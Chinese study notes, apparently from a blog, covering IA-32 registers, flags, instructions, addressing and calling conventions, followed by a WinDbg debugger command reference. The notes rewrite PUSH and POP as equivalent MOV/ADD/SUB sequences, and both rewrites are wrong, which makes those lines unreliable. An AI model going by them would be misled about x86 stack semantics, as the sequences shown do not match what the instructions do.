实地址方式下CPU只能访问00000H~FFFFFH的地址空间(继承自8086/8088处理器,只有20根地址线),且只支持分段管理,每个段的大小为64KB,不支持分页存储管理机制,因为实地址方式下访问的是真实的物理地址. 在开机或重设系统后IA-32系列CPU就处于实地址方式.在完成初始化工作和进入保护方式的准备后就会切换到保护方式. 实地址方式可以访问8个32位通用寄存器,但EIP,ESP,EFLAGS都只有低16位(FLAGS)起作用. 实地址方式下处理器的基本执行环境和基本指令集与保护方式是相同的.不过间接寻址中不能使用比例因子. 系统管理模式 SMM(system management mode),源于Intel 386 SL处理器,SMM模式是IA-32处理器的标准特性.为操作系统和系统管理软件提供了一种透明的机制,用于实现电源管理和OEM厂商特有的特性. 通过激活外部系统中断引脚(SMI#),产生系统管理中断SMI,由此可以进入SMM模式.在进入SMM时,处理器切换到单独的地址空间,同时会保存当前运行的程序/任务的环境上下文.这样SMM专用的代码可以透明地执行(即操作系统/应用程序不受SMM模式的代码影响).当退出SMM模式后,处理器被置于SMI之前的状态,继续执行被中断的程序/任务. 切换工作方式 在加电冷启动,或者重置reset后,处理器处于实地址方式. CR0寄存器的PE标志位用于控制处理器在实模式与保护模式之间的切换. EFLAGS标志寄存器的VM标志位用于控制处理器在虚拟8086模式与保护模式之间的切换. 这两种模式的转换通常是随着任务切换或中断/异常处理返回实现的. 无论何时接收到SMI中断且无论处理器处于何种工作方式,处理器都会切换进入SMM模式,当执行RSM(SMM返回指令)后,处理器会切换回SMI发生时的工作方式. 寄存器 IA-32系列CPU有多种寄存器.除了通用寄存器,专用寄存器(EIP,EFLAGS)和段寄存器统称为定点寄存器组,除此之外还有浮点寄存器栈和多媒体扩展寄存器组. 通用寄存器 IA-32系列CPU有8个32bit通用寄存器,EAX,EBX,ECX,EDX,ESP,EBP,ESI,EDI,它们的低16位是8个16位的通用寄存器,名称沿用以前的AX,BX,CX,DX,SP,BP,SI,其中AX,BX,CX,DX的高八位和低八位又分为*H/L.这些都是Intel系列向前兼容的风格(Intel 80386前的CPU最多允许16位操作数). 这些寄存器除了通用功能外还有各自的特殊用途,累加器EAX,基地址寄存器EBX,计数寄存器ECX,数据寄存器EDX,源变址寄存器ESI,目的变址寄存器EDI,基指针寄存器EBP,堆栈指针寄存器ESP(ESP只做此用途). 标志寄存器 IA-32系列CPU有一个32位的标志寄存器(EFLAGS Register),其含有一组状态标志,一组系统标志和一个控制标志. EFLAGS的状态标志位(0,2,4,6,7,11)指示算术指令(如add,sub,mul等指令)的结果. CF(bit 0):无符号数最高位进位或借位置1,否则置0.-----称为进位标志,检测无符号操作的溢出,比较无符号数大小,还可以配合移位指令. ZF(bit 6):结果为0置1,否则置0.-----称为零标志,检测结果是否为0. SF(bit 7):带符号数的符号位.-----称为符号标志,其值为运算结果的最高位,检测结果是否为负数. OF(bit 11):带符号数溢出置1,否则置0.-----溢出标志,检测补码溢出. PF(bit 2):反应运算结果最低字节为1的位数,偶数个1置1,否则置0.-----用于串行通信的奇偶校验. AF(bit 4):反应运算结果第3位是否发生进位/借位或低4位是否有进位/借位,是置1,否则置0.-----被BCD(binary-code decimal)算术运算使用. EFLAGS的控制标志位. DF(bit 10):控制串指令(MOVS,CMPS,SCAS,LODS以及STOS).设置DF标志使得串指令自动递减,清除该标志则使得串指令自动递增.STD以及CLD指令分别用于设置以及清除DF标志. EFLAGS的系统标志以及IOPL域用于控制操作系统或是执行操作,不允许被应用程序所修改. TF(bit 8):置1以允许单步调试模式,置0则禁用. IF(bit 9):置1以响应可屏蔽中断,置0则禁用. IOPL(bits 12 and 13):指示当前运行任务的I/O特权级(I/O privilege level).(正在运行任务的当前特权级(CPL)必须小于或等于I/O特权级才能允许访问I/O地址空间.只能在CPL为0时才能通过POPF以及IRET指令修改) NT(bit 14):控制中断链和被调用任务.当前任务与前一执行任务相关则置1,否则置0. RF(bit 16):控制处理器对调试异常的响应. VM(bit 17):置1以允许虚拟8086模式,置0则返回保护模式. AC(bit 18):标志及在CR0寄存器中的AM位置都为1时才允许内存引用的对齐检查. VIF(bit 19):IF标志的虚拟镜像(Virtual image),与VIP标志结合起来使用.使用该标志及VIP标志,并设置CR4控制寄存器的VME标志就可以允许虚拟模式扩展(virtual mode extensions). VIP(bit 20):置1以指示一个中断正在被挂起,当没有中断挂起时该位置0.与VIF标志结合使用. ID(bit 21):设置或清除这个标志指示处理器对CPUID指令的支持. 段寄存器 IA-32系列CPU有一组段寄存器,支持以分段方式管理存储器.分段存储管理方式中程序使用中的存储单元总会属于某个段,所以可以使用某段某单元对存储单元进行顶为定位,其形式为段号:偏移,也称为逻辑地址. 对于实地址方式和保护方式来说段号是不一样的,实地址方式段号是段值,而保护模式段号是段选择子. 它们都会从段号获取段起始地址,与偏移相加后就得到了实际的物理地址. 在保护方式下物理地址为32位,段起始地址和偏移都为32位,而实地址方式下物理地址20位,段起始地址20位,偏移则是16位. 逻辑地址中当前使用段的段号存放在段寄存器中,早期Intel 8086有四个段寄存器:CS(代码段寄存器),SS(堆栈段寄存器),DS(数据段寄存器),ES(附加段寄存器),从Intel 80386开始新增了两个附加段寄存器:FS,GS,沿用至今. 这6个段寄存器可见部分的长度都是16位,实地址方式下存放16位的段值,保护方式下存放16位的段选择子. 不能显式地改变CS段寄存器,也不能把立即数直接传送到段寄存器中. 指令指针寄存器 IA-32系列CPU有一个32位的指令指针寄存器EIP,CPU通过CS和EIP确定所取指令的存储单元位置. CPU通过增加EIP以当前指令长度的值来顺序的执行程序,通过修改EIP可以控制程序的执行,完成跳转. 汇编指令 CPU能直接识别并执行的指令就是机器指令,机器指令采用二进制编码,一般由操作码和操作数组成.汇编语言需要被汇编器编译成机器指令才能被CPU执行. 汇编语言的指令格式. 1[标识符:] [指令助记符] [操作数表] [;注释] 只有指令助记符是必须的,操作数表依指令助记符而定.默认情况操作数可以是通用寄存器,存储单元或立即数. 如果存储器操作数长度不定(也就是两个都是存储器操作数),需要使用MOV BYTE/WORD/DWORD/QWORD PTR DEST,SRC(MOV DEST,BYTE/WORD/DWORD/QWORD PTR SRC)形式的指令指定操作数长度. 同时有些汇编器支持FAR,NEAR来说明标号的类型(远近). IA-32系列CPU通用指令基本编码格式如下. 传送指令 123456MOV DEST,SRC#即赋值操作,DEST&lt;=SRC,两个操作数长度需一致,DEST必须是通用寄存器或存储单元.XCHG OPRD1,OPRD2#将两个操作数的内容交换,两个操作数长度需一致,DEST,SRC必须是通用寄存器或存储单元且至少有一个通用寄存器.LEA REG,OPRD#REG&lt;=&amp;OPRD,将操作数OPRD的有效地址传送到操作数REG,OPRD必须为存储器操作数,REG必须是一个16位或32位的通用寄存器,且不影响各标志位. 加减指令 1234567891011121314ADD DEST,SRC#DEST&lt;=DEST+SRC,将两个操作数内容相加并赋值给DEST,DEST必须是通用寄存器或存储单元.SUB DEST,SRC#DEST&lt;=DEST-SRC,用DEST内容减SRC内容并赋值给DEST,DEST必须是通用寄存器或存储单元.INC DEST#DEST&lt;=DEST+1,DEST必须是通用寄存器或存储单元.DEC DEST#DEST&lt;=DEST-1,DEST必须是通用寄存器或存储单元.NEG DEST#DEST&lt;=0-DEST,对操作数取补,,DEST必须是通用寄存器或存储单元.ADC DEST,SRC#DEST&lt;=DEST+SRC+CFSBB DEST,SRC#DEST&lt;=DEST-(SRC+CF) 乘除指令 12345678910111213141516171819202122232425MUL OPRD#TYPE OPRD == BYTE -&gt; AX&lt;=OPRD*AL#TYPE OPRD == WORD -&gt; DX:AX&lt;=OPRD*AX#TYPE OPRD == DWORD -&gt; EDX:EAX&lt;=OPRD*EAX#OPRD不能是立即数IMUL OPRD#除了将操作数当作有符号数外与MUL一样IMUL DEST, SRC#DEST&lt;=DEST*SRC,目的操作数DEST只能是16位或者32位通用寄存器.SRC无限制,但要求数据长度与DEST一致,为立即数的话只要长度不大于DEST数据长度即可IMUL DEST, SRC1, SRC2#DEST&lt;=SRC1*SRC2,目的操作数DEST只能是16位或者32位通用寄存器.SRC1可以是通用寄存器或存储单元,数据长度与DEST一致.SRC2只能是立即数,同样有大小限制#有符号数乘法指令后两种操作可能有溢出现象,处理方式为截去高位.溢出会导致CF,OF为1(包括单操作数时高半部分有有效位).#无论操作数是不是有符号数,乘积的低位是相同的,所以无符号乘法指令没有双操作数和三操作数形式.DIV OPRD#TYPE OPRD == BYTE -&gt; AL&lt;=AX/OPRD,余数AH#TYPE OPRD == WORD -&gt; AX&lt;=DX:AX/OPRD,余数DX#TYPE OPRD == DWORD -&gt; EAX&lt;=EDX:EAX/OPRD,余数EDX#OPRD不能是立即数IDIV OPRD#同上,只不过为有符号数.#如果不能整除,余数符号与被除数一致,余数绝对值小于除数的绝对值#除数为0,商太大或太小都会引起除法出错导致异常,除法指令对状态标志的影响无定义 逻辑运算指令 IA-32逻辑运算指令有NOT,AND,OR,XOR和测试指令TEST,除了NOT外均有两个操作数.下面是它们的通用说明. DEST可以为通用寄存器或存储单元. 只有一个操作数的话该操作数同时是源和目的操作数. 两个操作数最多一个是存储单元. 操作数可以是字节,字,双字,但是两个操作数数据长度必须一致. 12345678NOT OPRD#OPRD&lt;=~OPRD,对标志位无影响AND DEST, SRC#OPRD&lt;=DEST&amp;SRC,CF=0,OF=0,PF,ZF,SF反映运算结果OR DEST, SRC#OPRD&lt;=DEST|SRC,CF=0,OF=0,PF,ZF,SF反映运算结果XOR DEST, SRC#OPRD&lt;=DEST^SRC,CF=0,OF=0,PF,ZF,SF反映运算结果 移位指令 123456789101112131415SAL/SHL OPRD, count#算术左移指令和逻辑左移指令,效果相同,且是同一条机器指令.OPRD可以为寄存器或存储单元,count可以为8位立即数或寄存器CL(表示取CL低5位)#左移count位,右边补0,移出的最高位进入CFSAR OPRD, count#算术右移指令,右移count位,左边补符号位,移出的最低位进入CFSHR OPRD, count#逻辑右移指令,右移count位,左边补0,移出的最低位进入CFROL/ROR OPRD, count#左/右循环移位指令,移出位作为填充,同时进入CFRCL/RCR OPRD, count#带进位左/右循环移位指令,移出位进入CF,CF作为填充SHLD/SHRD OPRD1, OPRD2, count#OPRD1可以为寄存器或存储单元,OPRD2只能是寄存器,且数据长度需与OPRD1一致.#把OPRD1左/右移指定的count位,使用OPRD2高/低端的count位填充,OPRD2不变,OPRD1最后移出的位进入CF#仅仅移动一位的情况下若符号位发生变化,OF=1,否则OF=0 比较指令 1234CMP DEST,SRC#相当于不改变DEST的SUB,仅影响标志位TEST DEST, SRC#与AND类似,但只影响状态标志,不改变DEST 循环指令 12345678LOOP LABEL#循环指令只用一个字节表示地址差,所以循环转移的范围仅为-128~+127.#保护方式下循环指令将自动以寄存器ECX作为循环计数器.#等于:DEC ECX;CMP ECX, 0;JNZ LABEL.LOOPE/LOOPZ LABEL#多一个判断,如果ECX不等于0且零标志ZF为1就转移到LABEL处,指令本身对ECX减一的操作不影响标志.LOOPNE/LOOPNZ#如果ECX不等于0且零标志ZF为0就转移到LABEL处,指令本身对ECX减一的操作不影响标志. 串操作指令 在串操作指令中涉及源操作数时默认使用ESI和数据段寄存器DS;涉及目的操作数时默认使用EDI和附加段寄存器ES. 串操作指令会自动调整作为指针使用的寄存器(ESI,EDI)的值,调整的大小为字符的大小,调整的方向由DF(标志寄存器的位10)控制,为0时递增,为1时递减,下面默认DF=0. 12345678910111213141516171819202122232425262728293031LODSB#MOV AL, [ESI];INC ESI;LODSW#MOV AX, [ESI];ADD ESI, 2;LODSD#MOV EAX, [ESI];ADD ESI, 4;STOSB#MOV [EDI], AL;INC EDI;STOSW#MOV [EDI], AX;ADD EDI, 2;STOSD#MOV [EDI], EAX;ADD EDI, 4;MOVSB#MOV BYTE PTR [EDI], [ESI];INC ESI;INC EDI;MOVSW#MOV WORD PTR [EDI], [ESI];ADD ESI, 2;ADD EDI, 2;MOVSD#MOV DWORD PTR [EDI], [ESI];ADD ESI, 4;ADD EDI, 4;#不影响标志SCASB#CMP AL, [EDI];INC EDI;SCASW#CMP AX, [EDI];ADD EDI, 2;SCASD#CMP EAX, [EDI];ADD EDI, 4;CMPSB#CMP BYTE PTR [ESI], [EDI];INC ESI;INC EDI;CMPSW#CMP WORD PTR [ESI], [EDI];ADD ESI, 2;ADD EDI, 2;CMPSD#CMP DWORD PTR [ESI], [EDI];ADD ESI, 4;ADD EDI, 4; 重复操作前缀 1234567#串操作指令前缀REP CODE#CODE为一个串操作指令,REP重复CODE指令,每次重复判断ECX是否为0,为0结束重复,否则ECX减一,继续重复.REPE/REPZ CODE#同REP,但是判断过程多了对ZF的判断,ZF为0也结束重复.REPNZ/REPNE #同REP,但是判断过程多了对ZF的判断,ZF为1也结束重复. 位操作指令 位操作指令分为位测试指令和位扫描指令. 位测试指令 位测试指令中的两个操作数分别指定位串(OPRD1,16或者32位的通用寄存器/存储单元地址)和位号(OPRD2,与OPRD1大小相同的通用寄存器或者8位立即数,最后膜OPRD1的位大小). 12345678BT OPRD1, OPRD2#CF=OPRD1.bits[OPRD2]BTC OPRD1, OPRD2#CF=OPRD1.bits[OPRD2];~OPRD1.bits[OPRD2];BTR OPRD1, OPRD2#CF=OPRD1.bits[OPRD2];OPRD1.bits[OPRD2]=0;BTS OPRD1, OPRD2#CF=OPRD1.bits[OPRD2];OPRD1.bits[OPRD2]=1; 位扫描指令 位扫描指令的OPRD1是16或者32位的通用寄存器,OPRD2是与OPRD1大小相同的通用寄存器或者存储单元. 12345BSF OPRD1, OPRD2#从低位向高位扫描OPRD2中第一个为1的位并将对应的位号赋值给OPRD1.BSR OPRD1, OPRD2#从高位向低位扫描OPRD2中第一个为1的位并将对应的位号赋值给OPRD1.#如果OPRD2为0,则ZF=1,OPRD1不确定.否则ZF=0. 状态标志操作指令 1234567891011121314CLC#CF&lt;=0STC#CF&lt;=1CMC#CF&lt;=!CFLAHF#AH&lt;=EFLAGS低八位SAHF#EFLAGS低八位&lt;=AH,只影响对应的状态标志(SF,ZF,AF,PF,CF).CLD#DF&lt;=0STD#DF&lt;=1 转移指令 转移指令不影响标志位. 还有计数器转移指令JECXZ,当ECX为0就转移. 条件设置字节指令 条件设置字节指令不影响标志位. 堆栈指令 堆栈是一段内存区域,以低地址为栈顶,高地址为栈底.由ESP指示偏移,SS指示区域,合指栈顶,栈底由内核变量记录. 12345678910111213PUSH SRC#将SRC操作数压入堆栈,同时ESP-=SRC的长度#等同于:MOV ESP,SRC;SUB ESP,SRC_LENPOP DEST#将栈顶的数据赋给DEST,ESP+=DEST的长度#等同于:ADD ESP,DEST_LEN;MOV DEST,ESPPUSHA#将所有16位通用寄存器的内容压入堆栈,顺序为AX,CX,DX,BX,SP,BP,SI,DI.然后SP-=16.POPA#执行PUSHA相反操作.SP+=16.PUSHAD#将所有32位通用寄存器的内容压入堆栈,顺序为EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI.然后ESP-=32.POPAD 符号扩展指令 123456789CBW#把寄存器AL的值符号扩展到AH,即用AL的符号位填充AHCWD#把寄存器AX的值符号扩展到DXCDQ#把寄存器EAX的值符号扩展到EDXCWDE#把寄存器AX的值符号扩展到EAX高半部分#都不影响状态标志 扩展传送指令 12345MOVSX DEST, SRC#DEST只能时通用寄存器,SRC可以为通用寄存器或存储单元.DEST数据长度必须大于SRC,该指令将SRC符号扩展后赋值给DEST.#DEST可以为16位或32位,SRC可以为8位或16位MOVZX DEST, SRC#同上,只是SRC进行的是零扩展 过程调用指令和返回指令 12345CALL OPRD#PUSH PC;EIP&lt;=OPRD;实际只比跳转多了一个返回地址压栈.RET [count]#POP EIP.#ESP&lt;=ESP+count 中断控制指令 1234CLI#屏蔽中断STI#恢复中断 进行不能分离的操作比如设置栈基址SS和偏移地址SP时,需要先屏蔽中断. 寻址方式 CPU常用的寻址方式可分为:立即寻址,寄存器寻址和存储器寻址.(此外还有固定寻址和I/O端口寻址) 立即寻址 立即寻址即直接将操作数作为指令的一部分给出,这样的操作数也称为立即数.(只有源操作数使用立即寻址,且此时源操作数的长度由目的操作数决定) 寄存器寻址 寄存器寻址即使用寄存器的内容作为操作数,在指令中将寄存器名给出. 存储器寻址 存储器寻址即给出存储单元偏移从而通过偏移和段起始地址访问对应存储单元作为操作数的方式.有多种存储器寻址方式. 直接寻址:MOV EAX, [95480H]. 寄存器间接寻址:通过基址,变址,比例和位移量获取存储器单元偏移,偏移EA为:基址+变址*比例+位移量.mov EAX, [ESI + EDI * 4 + 12H].其中基址可以为所以通用寄存器,变址可以为除ESP所以通用寄存器,比例可以为1,2,4,8,位移量为一个数. 在32位的存储器寻址方式中,如果基址寄存器不是EBP或ESP,默认段寄存器为DS,是的话默认段寄存器为SS. 实地址方式存储单元的有效地址(偏移)不应该超过FFFFH,超过则会触发异常. 分支与循环 分支程序一般使用cmp,test等指令判断,条件跳转指令跳转配合实现.减少转移是优化分支的方法. 循环程序与分支程序同理,只需要添加一个若不满足条件则跳回开头的指令序列即可,同时IA-32还提供了专门的循环指令loop. 过程调用 C语言中的函数就是汇编语言中的子程序,也就是过程.其本质是控制流的转移(PC的改变),CPU提供专门的指令call,ret来进行过程调用与返回. 调用时将返回地址入栈(一个存储数据的区域),返回时通过读取栈中的返回地址返回,本质上就是数据的读写. 函数调用将栈划分为一个个栈帧,从逻辑上讲,栈帧就是一个函数执行的环境:函数参数,函数的局部变量,函数返回地址等等. ebp即帧指针,指向当前栈帧的底部,上一栈帧的顶部.esp即栈指针,指向当前栈帧的顶部(同时也是栈的顶部),下一将要插入的栈帧的底部.这两个指针的值规定了当前栈帧范围. 函数调用前首先要处理参数,x86有三种常用调用约定,cdecl(C规范),stdcall(WinAPI默认),fastcall函数调用约定.x86的Linux使用cdecl调用. cdecl:参数从右往左一次入栈,调用者实现栈平衡,返回值存放在eax中. stdcall:参数从右往左一次入栈,被调用者实现栈平衡,返回值存放在eax中. fastcall:参数1,2分别保存在ecx,edx;剩下的参数从右往左一次入栈,被调用者实现栈平衡,返回值存放在eax中. x86-64的Linux前六个整型参数通过寄存器传递,按顺序为:rdi,rsi,rdx,rcx,r8,r9.同时xmm0到xmm7用来放置浮点参数,其他的参数入栈(从右至左向8字节对齐). 在参数处理完后就会执行call指令,这个指令首先将返回地址放入栈中,然后跳转到函数代码执行. 被调用的函数会在开始保存ebp,赋值ebp为esp,然后对esp进行减操作来扩展栈的内存空间以容纳局部变量,此时该函数的栈帧成型. 被调用函数执行完后通过ret指令返回调用函数,ret之前会赋值esp为ebp(之前保存的),然后恢复ebp,此时栈顶为返回地址.ret通过返回地址跳转. 堆栈平衡其实就是主程序与子程序之间栈帧的切换,堆栈平衡不断复用栈的空间存储栈帧,使函数调用内存消耗变少. 123456push ebpmov ebp, espsub esp, 0x20 ;为局部变量开辟空间;...leave ;等于:mov esp, ebp;pop ebp;ret 由于程序运行过程中会使用到各寄存器来进行数据处理,而子程序可能会改变主程序正在使用的寄存器.这就需要进行选择,子程序和主程序谁来保护寄存器的值. 其中x86-64采用了一组统一的寄存器使用惯例,%rbx,%rbp,%r12~%r15为被调用者保存寄存器,而所有其他寄存器除了%rsp都为调用者保存寄存器. 系统调用 32位Linux系统调用通过int 0x80来实现的,eax寄存器中为调用的功能号,ebx,ecx,edx,esi等寄存器则依次为参数. 该调用是从左至右依次传参,与普通函数不同.在线32位系统调用号. 64位Linux系统调用通过syscall指令进入,传参寄存器为:rdi,rsi,rdx,r10,r8和r9.rax为系统调用号. 系统调用限制最多6个参数.返回结果在rax寄存器中.在线64位系统调用号. 系统调用定义文件/usr/include/asm/unistd_32.h,/usr/include/asm/unistd_64.h,/usr/include/bits/syscall.h. 汇编指示与伪指令简介 汇编指示与伪指令是汇编器提供的用于定义段名,过程名和控制一些编译选项的指令,各汇编器有所不同. MASM 1234567891011121314151617181920.686p;指定处理器的型号或适用的指令集,.686p表示Pentium Pro及以上的处理器include listing.inc;包含文件listing.inc.model flat;采用平坦模式,各存储段重叠.INCLUDELIB LIBCMTD;包含导入库文件CONST SEGMENT;段CONST开始$haa DB '\n', 00H;定义变量CONST ENDS;段CONST结束PUBLIC _main;声明公用标号_mainEXTRN _printf:PROC;声明外部过程_printf_TEXT SEGMENT_var1$=-4;定义符号值,标识符_var1代表常数-4_main PROC;过程_main开始 ..._main ENDP;过程_main结束_TEXT ENDSEND;指示程序结束 NASM 1234567891011121314segment text;命名段textorg 100H;段内偏移从100H开始计算,COM程序会从段内偏移100H开始执行MOV AX, CSMOV DS, AX;使数据段和代码段相同MOV DX, hello;参数[DS:DX]MOV AH, 9;调用号INT 21H;调用系统例程输出字符串MOV AH, 4CHINT 21H;调用系统例程结束程序hello db "Hello,world", 0DH, 0AH, '$']]></content>
      <categories>
        <category>CS</category>
        <category>BASIC</category>
      </categories>
      <tags>
        <tag>assembly</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-reverse-tool-WinDbg]]></title>
    <url>%2Fposts%2Fefc29a0d%2F</url>
    <content type="text"><![CDATA[WinDbg WinDbg是Windows平台上的用户态和内核态调试工具支持x86,IA64,AMD64平台.官网下载即可. 调试符号 WinDbg允许指定一个或多个目录来存放符号文件,并使用环境变量_NT_SYMBOL_PATH来指向这些目录.对于操作系统内部模块的符号文件,可以根据使用的模块版本访问微软提供的符号服务器. 也可以设置好符号服务器自动获取,前面设置的下载文件的储存目录为C:\Symbols,后面设置访问的url(等同于命令!symfix C:\Symbols). 调式时可以使用ld命令从符号文件目录或符号服务器加载符号,使用lm命令或Debug-&gt;Modules显示模块列表. WinDbg中对符号的表示方式为Module!Symbol,如kernel32!OpenProcess,但操作系统的内核模块是例外,统一使用nt这个模块名表示,如nt!NtOpenProcess. WinDbg提供了符号检索功能,命令格式:x [Options] Module!Symbol,检索时可以使用*,?,[],#,+等字符进行模糊匹配. 在有符号文件支持的情况下,WinDbg支持源代码调试.Ctrl + P指定源代码文件路径即可(可以指定多个路径). 调式过程 WinDbg支持多种调式模式. 以打开/附加的方式调试本地应用程序. 分析Dump文件. 远程调试. 内核调试分五种:NET,USB,1394,COM和本地.前四种都是双机调试模式. 附加进程时的非入侵模式,Dump文件分析和本地内核调试都属于非实时调试模式,不能直接控制被调试目标的中断和运行,一般用来观察/修改内存数据和分析数据结构. WinDbg调试程序默认停在ntdll.dll中的系统断点处,可以在命令窗口(Alt + 1)输入:g@$exentry转到程序入口处. WinDbg控制进程功能在Debug选项卡中.下为对应的命令与快捷键. 选项卡命令 命令行命令 快捷键 功能 Go g F5 运行程序 Step Into t F8或F11 单步追踪执行,进入call Step Over p F10 单步执行,不进入call pa addr 单步到指定地址,不进入call ta addr 追踪到指定地址,进入call pc [count] 单步执行到下count个call指令调用 tc [count] 追踪执行到下count个call指令调用,遇到call进入 tb [count] 追踪执行到下count条分支指令,遇到call进入,只适用于内核调试 pt 单步执行到下一个call返回指令 tt 追踪执行到下一个call返回指令,遇到call进入 ph 单步执行到下一条分支指令 th 追踪执行到下一条分支指令,遇到call进入 wt 自动追踪函数执行过程 断点命令 1234567bp[ID] [Options] Address [Passes] ["CommandString"]#设置软件断点(INT 3).#ID:指定断点ID.内核调试限32个断点,用户模式不限.#Options:"/1"-&gt;一次性断点."/c"-&gt;指定最大调用深度,大于这个深度断点不工作."/C"-&gt;指定最小调用深度.#Address:地址或符号.#Passes:忽略中断的次数.#CommandString:用于指定一组命令,当断点中断执行这组命令,""包围,;分割命令. bp所设断点与地址关联;bu功能与bp基本相同,但所设断点与符号关联,且所设断点会保存在工作空间中,供下次使用;bm功能与bp基本相同,但支持设置含通配符的断点,可以一次创建一个或多个bu/p断点. 1234ba[ID] Access Size [Options] Address [Passes] ["CommandString"]#Access:指定触发断点的方式."e"-&gt;在读取或执行指令时触发断点,"r"-&gt;在读取数据时触发断点,"w"-&gt;在写入数据时触发断点,"i"-&gt;在执行输入/输出访问时触发断点.#Size:访问的长度.单位为byte,最大为系统字长.#Address:断点地址,需要按Size对齐. 硬件断点最大数量取决于处理器,x86系统支持4个断点.可以通过CommandString设置条件断点. 12bp/u/m/a Address ".if(@eax=0x12ffc4)&#123;&#125;.else&#123;gc&#125;"#gc表示继续执行 12345678bl#列出当前断点bc 1-3,4#删除1,2,3,4号断点bd *#禁止所有断点be 5#启用5号断点 栈命令 12345678910111213141516171819202122232425262728293031k # ChildEBP RetAddr00 0061fa4c 77309126 ntdll!LdrpDoDebuggerBreak+0x2b01 0061fcac 772b1d11 ntdll!LdrpInitializeProcess+0x1ba602 0061fd04 772b1c01 ntdll!_LdrpInitialize+0xba03 0061fd10 00000000 ntdll!LdrInitializeThunk+0x1#ChildEBP记录栈帧的基地址,即EBP.kp#把参数和参数值以函数原型的形式显示出来,包括参数类型,名字,取值(要求符号完整)kb # ChildEBP RetAddr Args to Child00 0061fa4c 77309126 2d4a7416 0037b000 00000000 ntdll!LdrpDoDebuggerBreak+0x2b01 0061fcac 772b1d11 2d4a75be 00000000 00000000 ntdll!LdrpInitializeProcess+0x1ba602 0061fd04 772b1c01 00000000 00000000 00000000 ntdll!_LdrpInitialize+0xba03 0061fd10 00000000 0061fd24 77260000 00000000 ntdll!LdrInitializeThunk+0x11#Args to Child是栈上的前三个参数.即ebp+8h,ebp+ch,ebp+10h.kv # ChildEBP RetAddr Args to Child 00 0061fa4c 77309126 2d4a7416 0037b000 00000000 ntdll!LdrpDoDebuggerBreak+0x2b (FPO: [Non-Fpo])01 0061fcac 772b1d11 2d4a75be 00000000 00000000 ntdll!LdrpInitializeProcess+0x1ba6 (FPO: [Non-Fpo])02 0061fd04 772b1c01 00000000 00000000 00000000 ntdll!_LdrpInitialize+0xba (FPO: [Non-Fpo])03 0061fd10 00000000 0061fd24 77260000 00000000 ntdll!LdrInitializeThunk+0x11 (FPO: [Non-Fpo])#kv比kb增加了帧指针省略信息(FPO)和调用约定的显示 kd0061fa4c 0061fcac0061fa50 77309126 ntdll!LdrpInitializeProcess+0x1ba60061fa54 2d4a74160061fa58 0037b0000061fa5c 00000000#...#展示栈中数据. 内存命令 查看内存. 123456d? address [L(l)n]#dw:双字节WORD格式,dd:4字节DWORD,dq:8字节格式,df:4字节单精度浮点数格式,dD:8字节双精度浮点数格式,dp:指针大小格式.#da:ASCII字符串,db:字节和ASCII字符串,dc:DWORD和ASCII字符串,du:Unicode字符串,dW:双字节WORD和ASCII字符串,ds:ANSI_STRING类型的字符串格式,dS:UNICODE_STRING类型的字符串格式.#dyb:显示二进制和字节,dyd:显示二进制和DWORD值.dds,dps,dqs显示地址及相关符号.#dt [moduleName!]classname:显示数据类型和数据结构.例如:dt ntdll!*列出NTDLL模块中所有结构.#地址范围可以使用L(l)参数设置,L4表示显示前4个数据. 搜索内存. 1234s -[type] range pattern#type表示搜索内容的数据类型.b-&gt;BYTE,w-&gt;WORD,d-&gt;DWORD,a-&gt;ASCII,u-&gt;Unicode.默认为b#range表示地址范围,可以是起始地址加终止地址,或者起始地址加L(长度),如果长度超过256M,使用"L?length"#pattern用于指定要搜索的内容,可以用空格分隔要搜索的数值 修改内存. 1234e&#123;a|u|za|zu&#125; address "String"#za/zu表示写入内容为以零结尾的ASCII和Unicode字符串,a/u表示不以零结尾.e&#123;a|b|d|D|f|q|u|w&#125; address [values]#a-&gt;ASCII,b-&gt;BYTE,d-&gt;DWORD,D-&gt;DOUBLE,f-&gt;FLOAT,q-&gt;8字节,u-&gt;Unicode,w-&gt;WORD. 显示内存属性. 1!address [Address] 其他常用命令 !开头的为扩展命令. !wow64exts.sw:32/64位互相切换. !dh &lt;module&gt;:获取模块映像头信息. !teb:查看当前线程环境块. !peb:查看进程环境块. !exchain:查看当前异常处理链与处理函数. !vadump:查看内存分页信息列表. !heap:查看已有堆. !heap -x [Chunk Address]:检查块是否属于LFH. dt &lt;struct name&gt;:查看数据结构. dt &lt;struct name&gt; &lt;addr&gt;:将指定地址处的数据作为指定的数据结构来解析. .printf "%? %? %?", arg1, arg2, ...:格式化输出(?代表type,参考as指令支持的type). .sympath+ &lt;path&gt;:添加符号路径,配合.reload(重新载入符号)命令使用. .server tcp:port=&lt;port&gt;:监听端口,等待远程调试. .formats &lt;expr&gt;:以不同的形式显示表达式的值. .echo str:打印字符串. .hh:帮助. lmf/lm:列举出已加载的模块. poi:相当于C语言中对指针的操作符*. r &lt;@eax, ...&gt;&lt;=value&gt;:查看/赋值寄存器组,单纯的r打印所以寄存器. rdmsr/wrmsr:读写MSR寄存器. u addr L(n):对目标地址进行反汇编,L(n)指定行数. 脚本编写 WinDbg支持脚本.$$&gt;&lt;c:\text.txt将把c:\text.txt当作脚本运行其中的指令并回显.等同于输入命令. 伪寄存器 在表达式中使用伪寄存器必须使用转义字符@. $exentry:当前进程入口地址. $ip指令指针寄存器. $ra:当前函数返回地址. $retreg:函数返回值. $csp:当前栈指针. $tpid:当前进程的PID. $tid:当前线程的标识. $ea:最后一条被执行指令的有效地址. $p:最后一条d命令打印的值. $bpNumber:对应断点的地址. $t0~$t19:自定义伪寄存器. $teb:TEB的地址. $peb:PEB的地址. $thread:PETHREAD地址. $proc:PEPROCESS地址. 别名 别名类似define宏,在执行时直接用内容替换.别名有两种,固定别名和自定义别名. 固定别名有$u0~$u9.定义语法为r $.u* = "hello".r表示赋值. 用于自定义别名的命令有as,ad,al.as位内存中的一些字符串定义别名(as /type name addr,例如as /ma error 04040dc);ad用于删除别名(ad Name,ad *);al用于列出别名. as支持的type:/ma-&gt;ASCII./mu-&gt;Unicode,/msa-&gt;ANSI_STRING,/msu-&gt;UNICODE_STRING,/e-&gt;Environment variable specified,/f-&gt;Specifies the contents of the file,/x-&gt;expr,/c-&gt;result of command. WinDbg预设宏如下. $ntnsym:ntoskrnl基址. $ntwsym:ntdll基址. $ntsym:根据用户态/内核态自动选择. 表达式 WinDbg能识别MASM和C++表达式,默认使用MASM表达式(使用.expr查看默认使用的表达式语法).使用@@c++(expr)(或??expr),@@masm(expr)(或?expr)指定表达式求值器. 